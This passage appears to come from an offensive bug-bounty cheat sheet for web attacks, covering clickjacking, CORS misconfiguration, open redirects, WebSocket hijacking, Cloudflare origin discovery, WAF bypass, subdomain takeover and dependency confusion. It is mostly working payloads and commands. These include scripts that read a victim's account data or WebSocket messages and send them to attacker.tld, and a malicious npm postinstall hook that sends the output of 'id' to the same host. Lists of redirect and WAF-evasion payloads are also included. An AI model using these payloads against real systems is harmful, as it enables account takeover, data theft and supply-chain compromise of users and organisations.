  .lure { position: absolute; top: 350px; left: 600px; cursor: pointer; z-index: 1; }
</style>
<div class="lure">CLAIM YOUR FREE iPHONE</div>
<iframe src="https://target.com/account/delete"></iframe>
```
**Bypass:** `<object>` instead of iframe if only XFO blocks iframes. **Trap:** only counts with an exploitable sensitive action — `/about` framed is not a bug. **Chain:** → 2FA disable / email change → ATO. **CVSS 4.0–6.0.**

### Iframe Attacks (sandbox escape / srcdoc XSS / frame-busting)
**Detect:** map iframes; check sandbox attributes, CSP frame-ancestors, postMessage flow.
**Primitives:** `sandbox="allow-scripts allow-same-origin"` = no sandbox; `srcdoc` runs in parent's origin → `<iframe srcdoc='<script>...</script>'>`; frame-busting blocked when `allow-top-navigation` missing → still embeddable for clickjacking.
**Chain:** XSS in a widget the target embeds → mass XSS on target's users. **CVSS 7.0–8.5.**

### CORS Misconfiguration
**Detect:** set `Origin: https://attacker.tld`, check ACAO + ACAC.
**Matrix:** echo `attacker.tld` + ACAC `true` → full credentialed read; `null` + `true` → exploit via iframe `srcdoc` (null origin); `*` + `false` → public data, usually not a bug.
**Payloads:**
```http
Origin: https://target.com.attacker.tld
Origin: https://attacker.tld.target.com
Origin: https://target.com@attacker.tld
Origin: null
```
```html
<script>fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://attacker.tld/?d='+encodeURIComponent(t)));</script>
<iframe srcdoc='<script>fetch(...)</script>'></iframe>
```
```bash
python3 corsy.py -u urls.txt -t 50
curl -sk -H 'Origin: https://attacker.tld' 'https://target.com/api/me' -i | grep -i 'access-control'
```
**Regex bypass:** `^https?://.*\.target\.com$` → `target.com.attacker.tld`; `endsWith('target.com')` → register `target.com`. **Chain:** → /api/me leak → ATO. **CVSS 7.5.**

### Open Redirect
**Detect:** params `?next= ?return= ?redirect= ?url= ?goto= ?target= ?dest= ?continue= ?rurl= ?returnTo=`; probe and watch `Location:`.
**Payloads:**
```
//attacker.tld
/\\attacker.tld
https://target.com.attacker.tld
https://target.com@attacker.tld
https:attacker.tld
http://attacker.tld#@target.com
javascript://target.com/%0aalert(1)      # → DOM XSS
```
```bash
cat urls.txt | qsreplace 'https://attacker.tld' | xargs -I% curl -sk -o /dev/null -w '%{redirect_url} %{url_effective}\n' '%' | grep attacker.tld
openredirex -l urls.txt -p ~/wordlists/redirects.txt -k FUZZ -o results.txt
```
**Chain:** OAuth code/token exfil → ATO; SSRF whitelist bypass; CSP bypass via redirect chain. **CVSS 4.0–6.0 solo / 7.5+ chained.**

### WebSocket Attacks (CSWSH / auth bypass / injection / DoS)
**Detect:** find ws/wss endpoints; check Origin validation, auth model.
**CSWSH (no Origin check):**
```html
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = e => fetch('https://attacker.tld/?d='+btoa(e.data));
ws.onopen = () => ws.send('{"action":"subscribe","channel":"private:'+victim+'"}');
</script>
```
**Other:** token in URL `wss://target/ws?token=...` leaks to history/logs/referer; message-level injection into backend RPC; 10MB frame DoS; subscribe to other users' channels without auth check.
```bash
wscat -c "wss://target/ws" -H "Authorization: Bearer $T"
websocat "wss://target/ws?token=$T"
```
**Chain:** CSWSH + private channel → message exfil + ATO via support chat. **CVSS 7.5–9.0.**

---

## Infra / Misc

### Cloudflare Bypass — Origin IP + WAF
**Detect:** `Server: cloudflare`, `cf-ray`, `__cf_bm`/`__cfuid` cookies.
**Origin discovery:** SecurityTrails historical A; cert SAN match on Shodan/Censys outside CF ranges (`ssl:"target.com" -country:US -org:cloudflare`); favicon hash; MX records; dnsdumpster; subdomain on non-CF PaaS sharing backend block; SSRF error-page leak; `ssl-cert-grabber-by-asn`.
```bash
curl -sk --resolve target.com:443:<ORIGIN_IP> https://target.com/
curl -sk -H "Host: target.com" https://<ORIGIN_IP>/
python3 CloudFail.py -t target.com
fav-up -u target.com
```
**WAF rule bypass (no origin):** `<svg/onload>`, `<details ontoggle>`; newline-split inline events; body fragmentation; multipart + Content-Type confusion; HTTP/2 smuggling; 0x0c null byte / unicode whitespace; empty-body POST with payload in header; WebSocket upgrade then arbitrary content.
**Chain:** origin discovery = bypass all WAF rules globally for the engagement. **Trap:** mTLS-pinned origins reject direct hits.

### WAF Bypass — All Techniques
**Detect:** wafw00f; fingerprint block page; each WAF has known tier.
**Encoding:** `%3C` / `%253C` / `&lt;` / `\u003c` / UTF-7 `+ADw-` / UTF-16 BOM / HTTP/0.9.
**Fragmentation:** HPP `?q=harm&q=<svg>`; chunk body split; multipart MIME variants.
**Headers:** `Transfer-Encoding: chunked` smuggling; HTTP/2 lone-pseudo; trailing whitespace in header name.
**Method:** GET→POST swap; OPTIONS/TRACE/WebDAV. **Timing:** slow drip 1 byte/sec; connection reuse. **Body size:** pad junk before payload (AWS WAF ~8KB). **Case:** `<ScRiPt>`. **Whitespace:** `%09 %0a %0b %0c %0d %a0`. **Comments:** `/**/`, `<!---->`.
```bash
wafw00f https://target
```
**Best long-term bypass:** origin discovery (cert SAN / favicon hash / historical A) → hit origin directly. **Chain:** bypass → land XSS/SQLi/RCE upstream. **CVSS = underlying bug.**

### Subdomain Takeover
**Detect:** `dnsx -cname -resp`; fetch each CNAME and fingerprint "unclaimed" errors (S3 `NoSuchBucket`, Heroku `no-such-app`, etc.). Register/claim the resource, host content under target.com.
```bash
subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/tools/subjack/fingerprints.json -v -o takeovers.txt
nuclei -l alive.txt -t http/takeovers/ -severity high,critical
subzy run --targets subs.txt --hide_fails
```
**Trap:** Vercel/Netlify/Heroku now require domain verification — legacy still claimable, verify before declaring. **Chain:** → parent-domain cookies → cross-site authenticated XSS / ATO. **CVSS 8.0+.**

### Dependency Confusion
**Detect:** read `package.json`, `requirements.txt`, `pom.xml`, `Gemfile.lock`, `go.mod`; find unscoped internal names absent from public registry.
**Exploit:** register scope/name, publish malicious package with higher version.
```js
{
  "name": "@example/internal-utils",
  "version": "9999.99.99",
  "scripts": { "postinstall": "node -e \"require('https').get('https://attacker.tld/?d='+require('os').hostname()+'-'+require('child_process').execSync('id'))\"" }
}
```
```bash
confused -l npm package.json
confused -l pypi requirements.txt
confused -l mvn pom.xml
```
**Trap:** npm orgs / pip private index harden this; still alive in mid-size orgs without internal registries. **Chain:** build-RCE → CI secrets → cloud takeover. **CVSS 9.0+.**

---
